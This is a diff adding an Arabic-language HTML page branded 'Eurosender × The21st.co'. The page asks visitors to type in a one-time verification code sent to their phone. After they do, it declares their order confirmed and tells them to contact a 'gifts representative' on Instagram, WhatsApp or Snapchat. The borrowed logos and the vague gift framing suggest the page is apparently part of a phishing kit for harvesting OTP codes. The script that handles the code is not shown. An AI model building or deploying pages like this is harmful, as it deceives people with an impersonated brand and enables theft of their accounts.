@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Eurosender × The21st.co — التحقق من الرمز</title>
+  <meta name="description" content="تحقق من رمز OTP الخاص بك لمتابعة طلبك بأمان">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="page">
+    <header class="topbar">
+      <div class="brand">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Eurosender_logo.svg/320px-Eurosender_logo.svg.png" alt="Eurosender" onerror="this.src='https://dummyimage.com/80x28/111827/ffffff.png&text=Eurosender'">
+        <span class="x">×</span>
+        <img class="logo2" src="https://the21st.co/logo.png" alt="The21st.co" onerror="this.src='https://dummyimage.com/86x28/111827/ffffff.png&text=The21st.co'">
+      </div>
+      <div class="meta">
+        <div class="title">التحقق من الرمز</div>
+        <div class="subtitle">خدمة لوجستية بالتعاون مع Eurosender و The21st.co</div>
+      </div>
+    </header>
+
+    <main class="shell">
+      <section class="card otp-card">
+        <h1>أدخل رمز التحقق</h1>
+        <p class="lead">لقد أرسلنا رمزًا مكوّنًا من 4 أو 6 أرقام إلى رقمك.</p>
+        <form id="otpForm" novalidate>
+          <div class="field">
+            <input id="otp" name="otp" class="ltr" inputmode="numeric" maxlength="6" placeholder="******" required>
+          </div>
+          <button id="verifyBtn" class="btn" type="submit">تأكيد</button>
+          <div id="loading">⏳ جاري التحقق...</div>
+        </form>
+        <div id="confirmation">
+          <h2>✅ تم تأكيد طلبك بنجاح</h2>
+          <div class="order-id" id="orderId"></div>
+          <div class="share-text">يرجى مشاركة هذا الرقم مع مندوب هدايا عبر:<br>Instagram / WhatsApp / Snapchat</div>
+        </div>
+      </section>
+    </main>
+
+    <footer class="footer">© <span id="year"></span> The21st.co — جميع الحقوق محفوظة.</footer>
+  </div>
+
+  <script src="otp.js"></script>
+</body>
+</html>
